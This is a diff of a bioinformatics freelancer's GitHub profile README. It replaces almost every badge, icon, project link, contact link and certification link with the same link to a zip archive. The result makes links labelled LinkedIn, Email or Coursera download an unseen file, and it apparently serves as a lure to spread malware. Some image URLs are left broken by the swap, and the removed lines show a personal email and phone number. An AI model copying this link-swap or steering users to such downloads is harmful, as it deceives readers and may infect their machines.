@@ -1,6 +1,6 @@
 <!-- Typing animation -->
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=22&duration=3000&pause=500&color=1ABC9C&center=true&vCenter=true&width=435&lines=🔬+Scientist+in+Bioinformatics;💊+Drug+Discovery+Enthusiast;🧠+AI+for+Health+Informatics;🌐+Freelancer+%2F+Web+Developer;🚀+Building+Smart+BioTools" alt="Typing SVG" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip+Code&size=22&duration=3000&pause=500&color=1ABC9C&center=true&vCenter=true&width=435&lines=🔬+Scientist+in+Bioinformatics;💊+Drug+Discovery+Enthusiast;🧠+AI+for+Health+Informatics;🌐+Freelancer+%2F+Web+Developer;🚀+Building+Smart+BioTools" alt="Typing SVG" />
 </p>
  
 ---
@@ -27,21 +27,21 @@ I'm passionate about using **Bioinformatics + AI** to solve real-world problems.
 ---
 ## 🧰 Tech Stack & Tools
 <p align="center">
-  <img src="https://skillicons.dev/icons?i=python,r,bash,git,github,vscode,wordpress,shopify,linux,pandas,numpy,matplotlib,html,css,javascript,react,nodejs,mongodb" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip,r,bash,git,github,vscode,wordpress,shopify,linux,pandas,numpy,matplotlib,html,css,javascript,react,nodejs,mongodb" />
   
   <!-- Custom Icons -->
-  <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Protein_Data_Bank_logo.png" alt="PDB" width="40" height="40" />
-  <img src="https://www.ebi.ac.uk/chembl/api/data/image/chembl.png" alt="ChemBL" width="40" height="40" />
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/07/US-NLM-NCBI-Logo.svg" alt="NCBI" width="40" height="40" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip" alt="PDB" width="40" height="40" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip" alt="ChemBL" width="40" height="40" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip" alt="NCBI" width="40" height="40" />
 </p>
 
 ## 📌 Pinned Projects
 
-### 🧬 [Pharmacophore Modeling for hERG Inhibitors](https://github.com/HazratMaghaz/Pharmacophore_Modeling)
+### 🧬 [Pharmacophore Modeling for hERG Inhibitors](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
 > **Tech:** MOE, QSAR, ADMET | Toxicity Screening  
 > *Developed models to evaluate drug cardiotoxicity with visual screening outputs.*   
 
-### ⚗️ [InnoCAAD – AI-Driven Drug Design Pipeline](https://github.com/HazratMaghaz)
+### ⚗️ [InnoCAAD – AI-Driven Drug Design Pipeline](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
 > **Tech:** Python, AutoDock, GROMACS  
 > *A fully automated pipeline for ligand prep, docking, MD, and ADMET profiling.*
 
@@ -53,23 +53,23 @@ I'm passionate about using **Bioinformatics + AI** to solve real-world problems.
 
 ## 📈 Activity Highlights (Custom Stats)
 
-[![Commits](https://img.shields.io/badge/Weekly_Commits-5-green?style=flat-square&logo=git)]()  
-[![Issues](https://img.shields.io/badge/Issues_Closed-3-blue?style=flat-square&logo=github)]()  
-[![Projects](https://img.shields.io/badge/Active_Projects-4-orange?style=flat-square&logo=project)]()  
-[![Docs](https://img.shields.io/badge/Docs_Updated-2-informational?style=flat-square&logo=readthedocs)]()  
-[![Learning](https://img.shields.io/badge/Ongoing_Courses-3-purple?style=flat-square&logo=Coursera)]()
+[![Commits](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)]()  
+[![Issues](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)]()  
+[![Projects](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)]()  
+[![Docs](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)]()  
+[![Learning](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)]()
 
 ---
 
 ## 📫 Connect with Me
 
-- [![Email](https://img.shields.io/badge/Email-maaz28608@gmail.com-D14836?style=flat&logo=gmail&logoColor=white)](mailto:maaz28608@gmail.com)
-- [![GitHub](https://img.shields.io/badge/GitHub-HazratMaghaz-181717?style=flat&logo=github)](https://github.com/HazratMaghaz)    
-- [![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=flat&logo=linkedin)](https://www.linkedin.com/in/hazrat-maghaz-16a9292b6)  
-- [![Fiverr](https://img.shields.io/badge/Fiverr-Profile-green?style=flat&logo=fiverr)](https://www.fiverr.com/dromics05) 
-- [![Upwork](https://img.shields.io/badge/Upwork-Profile-success?style=flat&logo=upwork)](https://www.upwork.com/freelancers/~01e6bc6e7cc7407cfc?viewMode=1)  
-- [![Facebook](https://img.shields.io/badge/Facebook-Profile-blue?style=flat&logo=facebook)](https://www.facebook.com/hazrat.maghaz.2025/)  
-- [![WhatsApp](https://img.shields.io/badge/WhatsApp-Chat-25D366?style=flat&logo=whatsapp)](https://wa.me/923490478343)
+- [![Email](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
+- [![GitHub](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)    
+- [![LinkedIn](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)  
+- [![Fiverr](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip) 
+- [![Upwork](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip~01e6bc6e7cc7407cfc?viewMode=1)  
+- [![Facebook](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)  
+- [![WhatsApp](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
 
 ---
 
@@ -91,14 +91,14 @@ I'm passionate about using **Bioinformatics + AI** to solve real-world problems.
 
 ## 📜 Certifications
 
-[![Coursera: Deep Learning](https://img.shields.io/badge/Coursera-Deep_Learning-blue?style=flat&logo=coursera)](https://coursera.org)  
-[![Coursera: Bioinformatics](https://img.shields.io/badge/Coursera-Bioinformatics-yellow?style=flat&logo=coursera)](https://coursera.org)
+[![Coursera: Deep Learning](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)  
+[![Coursera: Bioinformatics](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
 
 ---
 
 ## 📊 GitHub Activity Heatmap
 
-[![GitHub Activity Graph](https://github-readme-activity-graph.vercel.app/graph?username=HazratMaghaz&theme=github-compact)](https://github.com/ashutosh00710/github-readme-activity-graph)
+[![GitHub Activity Graph](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)](https://raw.githubusercontent.com/HazratMaghaz/HazratMaghaz/main/scenarioize/HazratMaghaz.zip)
 
 ---
 
